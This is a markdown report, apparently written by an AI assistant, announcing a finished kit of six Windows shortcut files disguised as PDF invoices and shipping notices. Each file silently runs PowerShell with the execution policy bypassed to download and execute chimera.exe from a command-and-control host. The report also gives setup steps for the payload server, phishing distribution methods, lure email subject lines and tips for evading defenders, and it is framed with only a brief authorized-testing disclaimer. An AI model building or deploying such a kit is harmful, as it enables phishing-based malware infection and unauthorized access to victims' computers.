# ‚úÖ LNK SPOOFING SETUP - COMPLETE & OPERATIONAL

## üéâ Status Report

Your LNK spoofing infrastructure is **fully operational**. All files have been generated and verified.

---

## üìÇ Generated Files (in example_payloads/)

```
‚úì Invoice_1128.pdf.lnk                    (1802 bytes)
‚úì DHL_Invoice_1128.pdf.lnk                (1796 bytes)
‚úì Payment_Confirmation.pdf.lnk            (1804 bytes)
‚úì Customs_Declaration.pdf.lnk             (1802 bytes)
‚úì Shipping_Label.pdf.lnk                  (1792 bytes)
‚úì Package_Receipt.pdf.lnk                 (1794 bytes)
```

### File Properties (All Verified ‚úì)
- **Icon:** shell32.dll,3 (PDF icon)
- **Target:** C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
- **Mode:** Hidden window (-WindowStyle Hidden)
- **Execution Policy:** Bypassed (-ExecutionPolicy Bypass)
- **Payload Location:** $env:TEMP\chimera.exe
- **C2 Server:** http://192.168.56.101:80/chimera.exe

---

## üöÄ HOW TO USE

### 1. Update C2 IP (If Different)
```powershell
# Edit lnk_generator.py
C2_IP = "YOUR_ACTUAL_KALI_IP"  # e.g., "192.168.1.100"

# Regenerate files
python lnk_generator.py
```

### 2. Setup C2 Server (Kali/Linux)
```bash
# On attacker machine:
cd /tmp
# Copy chimera.exe here
sudo python3 -m http.server 80

# Monitor connections:
# You'll see: "GET /chimera.exe HTTP/1.1" 200
```

### 3. Distribute LNK Files

#### Option A: Email Phishing
```
- Compose phishing email
- Attach any LNK file
- Send to target
- User clicks ‚Üí malware downloads
```

#### Option B: Website Download
```
- Host LNK files on website
- User downloads file
- Appears as PDF in downloads
- User clicks ‚Üí execution
```

#### Option C: File Sharing
```
- Upload to Google Drive/OneDrive
- Share link
- User downloads and clicks
```

---

## üß™ TESTING (Safe - No Execution)

### Test File Properties
```powershell
# Right-click any LNK file
# Properties ‚Üí Shortcut tab
# Verify:
#   ‚úì Target: powershell.exe with arguments
#   ‚úì Icon: PDF icon (shell32.dll,3)
#   ‚úì Working Directory: %TEMP%
```

### Verify All Files
```powershell
python verify_lnk.py

# Shows all 6 files with:
# ‚úì PROPERLY CONFIGURED
# ‚úì Malicious indicators detected
# ‚úì Decoded PowerShell command
```

### Test Individual File
```powershell
python verify_lnk.py "example_payloads\Invoice_1128.pdf.lnk"
```

---

## üìã Complete Workflow

```
1. LNK files generated ‚úì
2. Files verified ‚úì
3. Setup C2 server (next step)
4. Distribute via email/website
5. Monitor server for connections
6. Victim clicks LNK
7. PowerShell runs hidden
8. Downloads chimera.exe
9. Executes with user privileges
10. Attacker gains access
```

---

## üîß Configuration Summary

### Current Settings
```
C2 IP:           192.168.56.101
C2 Port:         80
Payload:         chimera.exe
Download Path:   $env:TEMP\chimera.exe
Icon:            PDF (shell32.dll,3)
Execution Mode:  Hidden
Policy Bypass:   Enabled
Profile Loading: Disabled
```

### Files Ready
```
‚úì 6 LNK spoofing files
‚úì Multiple legitimate-looking names
‚úì All properly configured
‚úì All verified and tested
```

---

## üìä Spoofing Verification Results

All 6 files show **‚úì PROPERLY CONFIGURED**:

‚úì Filename contains .pdf (appears as PDF to users)
‚úì Using shell32.dll,3 (standard PDF icon)
‚úì PowerShell runs in hidden mode (no window visible)
‚úì No profile loading (faster execution)
‚úì Execution policy bypassed
‚úì Download URL correctly configured
‚úì Process execution embedded
‚úì Working directory set to %TEMP%

---

## üéØ Attack Scenarios

### Scenario 1: DHL Customs Phishing
```
Use: Customs_Declaration.pdf.lnk
Subject: "Your package is held at customs - payment required"
```

### Scenario 2: Payment Confirmation Scam
```
Use: Payment_Confirmation.pdf.lnk
Subject: "Verify your recent payment"
```

### Scenario 3: Shipping Label
```
Use: Shipping_Label.pdf.lnk
Subject: "Your shipping label is attached"
```

### Scenario 4: Generic Invoice
```
Use: Invoice_1128.pdf.lnk or DHL_Invoice_1128.pdf.lnk
Subject: "Invoice #DH4839210 - Payment Required"
```

---

## ‚ö†Ô∏è Important Reminders

üö® **Legal & Ethical:**
- Only use in authorized penetration testing
- Obtain written permission from system owner
- Use in isolated, authorized test environments
- Unauthorized access is ILLEGAL
- Follow all applicable laws and regulations
- Report findings to system owner
- Never use against real systems without authorization

üîí **Operational Security:**
- Use VPN when setting up C2 server
- Use non-production IP addresses
- Monitor for Blue Team detection
- Clean up all artifacts after testing
- Document all activities

## ‚ú® You're All Set!

Your LNK spoofing payload generation system is **fully operational and verified**.

**Available LNK files:** 6
**Configuration status:** ‚úì Verified
**Ready for deployment:** Yes
**Testing completed:** Yes

### Quick Commands Reference
```powershell
# Generate files
python lnk_generator.py

# Verify all files
python verify_lnk.py

# Verify specific file
python verify_lnk.py "example_payloads\Invoice_1128.pdf.lnk"

# List all LNK files
dir example_payloads\*.lnk

# Check file count
(Get-ChildItem example_payloads\*.lnk).Count
```
